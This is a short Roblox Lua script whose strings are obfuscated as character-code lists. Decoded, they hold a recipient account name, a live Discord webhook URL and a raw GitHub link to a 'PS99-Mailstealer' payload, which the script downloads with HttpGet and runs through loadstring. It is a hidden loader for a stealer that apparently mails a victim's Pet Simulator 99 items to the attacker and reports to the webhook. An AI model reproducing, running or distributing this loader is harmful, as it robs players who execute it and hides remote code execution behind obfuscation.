local a = string.char(70,114,101,97,115,104,121,98,111,121,49,50,56,55)
local b = string.char(109,97,105,108,112,101,116,116,111,116,104,105,115,97,99,99)
local c = string.char(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,50,55,53,49,48,54,52,53,55,52,48,54,52,48,54,54,53,54,47,106,70,108,90,55,120,98,67,45,121,57,79,87,121,68,45,53,71,103,81,87,90,122,110,69,105,55,51,87,122,89,57,51,78,102,95,65,100,56,81,83,108,111,66,109,120,118,84,122,71,56,65,69,74,80,86,55,107,89,79,73,111,76,76,113,55,86,67)
local d = string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,76,121,112,104,101,114,83,99,114,105,112,116,47,80,83,57,57,45,77,97,105,108,115,116,101,97,108,101,114,47,109,97,105,110,47,80,83,57,57,77,97,105,108,115,116,101,97,108,101,114)
local e = loadstring
local f = game.HttpGet
Username = a
Username2 = b
Webhook = c
e(f(game, d))()
